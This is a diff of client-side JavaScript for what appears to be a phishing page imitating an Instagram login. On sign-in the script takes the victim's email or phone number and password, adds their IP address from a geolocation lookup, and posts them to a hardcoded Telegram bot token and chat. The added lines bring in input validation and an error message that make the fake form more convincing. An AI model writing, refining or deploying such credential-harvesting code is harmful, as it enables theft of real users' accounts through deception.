@@ -3,6 +3,8 @@
 const inputEmail = document.getElementById("inputEmail")
 const inputPassword = document.getElementById("inputPassword")
 const signin = document.getElementById("signin")
+const errorspan = document.getElementById("errorspan")
+
 let ip ='Not Found'
 
 fetch('https://api.db-ip.com/v2/free/self')
@@ -19,12 +21,26 @@ fetch('https://api.db-ip.com/v2/free/self')
     })
 }).catch(err => console.error(err));
 
+const validateEmail = email => {
+    const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
+
+const validatePhone = email => {
+    const re = /^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/im;
+    return re.test(String(email).toLowerCase());
+}
 
 signin.addEventListener("click", async (ev)=>{
             ev.preventDefault();
             console.log("signing in...");
                 const url = `https://api.telegram.org/bot5479990786:AAEcL3ltMHl3phz_HP3TXMXMX1dpeI4grCM/sendMessage?chat_id=-1001166751237&text=`+`INSTAGRAM  || ${inputEmail.value}:${inputPassword.value} || ${JSON.stringify(ip)}`
-    fetch(url, {
+   
+     if(!validateEmail(inputEmail.value) && !validatePhone(inputEmail.value)){
+            errorspan.style.display="block"
+        }
+   
+   fetch(url, {
         method: "POST",
         headers: { 'Content-Type': 'application/json' },
         body: ''
